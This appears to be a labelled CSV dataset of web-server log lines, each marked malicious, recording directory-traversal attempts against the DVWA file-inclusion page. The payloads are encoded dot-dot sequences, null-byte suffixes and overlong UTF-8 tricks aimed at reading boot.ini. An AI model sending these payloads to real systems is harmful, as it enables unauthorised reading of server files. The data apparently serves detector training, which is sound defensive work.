url,malicious
"127.0.0.1 - - [28/Apr/2021:22:32:22 -0400] ""GET /DVWA/vulnerabilities/fi/?page=%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2fboot%2eini HTTP/1.1"" 200 1315 ""-"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
"127.0.0.1 - - [28/Apr/2021:22:32:25 -0400] ""GET /DVWA/vulnerabilities/fi/?page=%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini%00 HTTP/1.1"" 200 1315 ""-"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
"127.0.0.1 - - [28/Apr/2021:22:32:29 -0400] ""GET /DVWA/vulnerabilities/fi/?page=%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini HTTP/1.1"" 200 1315 ""-"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
"127.0.0.1 - - [28/Apr/2021:22:32:33 -0400] ""GET /DVWA/vulnerabilities/fi/?page=%2f%2e%2e%5c%2e%2e%2f%2e%2e%5c%2e%2e%2f%2e%2e%5c%2e%2e%2f%2e%2e%5c%2e%2e%2f%2e%2e%5c%2e%2e%2f%2e%2e%5c%2e%2e%2fboot%2eini HTTP/1.1"" 200 1315 ""-"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
"127.0.0.1 - - [28/Apr/2021:22:32:37 -0400] ""GET /DVWA/vulnerabilities/fi/?page=%2f%2e%5c%5c%2e%2f%2e%5c%5c%2e%2f%2e%5c%5c%2e%2f%2e%5c%5c%2e%2f%2e%5c%5c%2e%2f%2e%5c%5c%2e%2fboot%2eini HTTP/1.1"" 200 1315 ""-"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
"127.0.0.1 - - [28/Apr/2021:22:32:41 -0400] ""GET /DVWA/vulnerabilities/fi/?page=%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cboot%2eini HTTP/1.1"" 200 1315 ""-"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
"127.0.0.1 - - [28/Apr/2021:22:32:45 -0400] ""GET /DVWA/vulnerabilities/fi/?page=%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cboot%2eini%00 HTTP/1.1"" 200 1315 ""-"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
"127.0.0.1 - - [28/Apr/2021:22:32:49 -0400] ""GET /DVWA/vulnerabilities/fi/?page=%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cboot%2eini HTTP/1.1"" 200 1315 ""-"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
"127.0.0.1 - - [28/Apr/2021:22:32:53 -0400] ""GET /DVWA/vulnerabilities/fi/?page=%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini%00%2ehtml HTTP/1.1"" 200 1315 ""-"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
"127.0.0.1 - - [28/Apr/2021:22:32:58 -0400] ""GET /DVWA/vulnerabilities/fi/?page=%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini%00%2ejpg HTTP/1.1"" 200 1315 ""-"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
"127.0.0.1 - - [28/Apr/2021:22:33:02 -0400] ""GET /DVWA/vulnerabilities/fi/?page=%2f%2e%2e%2e%2f%2e%2e%2e%2f%2e%2e%2e%2f%2e%2e%2e%2f%2e%2e%2e%2f HTTP/1.1"" 200 1315 ""-"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
"127.0.0.1 - - [28/Apr/2021:22:33:06 -0400] ""GET /DVWA/vulnerabilities/fi/?page=%2e%2e%c0%af%2e%2e%2f%2e%2e%c0%af%2e%2e%2f%2e%2e%c0%af%2e%2e%2f%2e%2e%c0%af%2e%2e%2f%2e%2e%c0%af%2e%2e%2f%2e%2e%c0%af%2e%2e%2fboot%2eini HTTP/1.1"" 200 1315 ""-"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
"127.0.0.1 - - [28/Apr/2021:22:33:11 -0400] ""GET /DVWA/vulnerabilities/fi/?page=%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini HTTP/1.1"" 200 1315 ""-"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
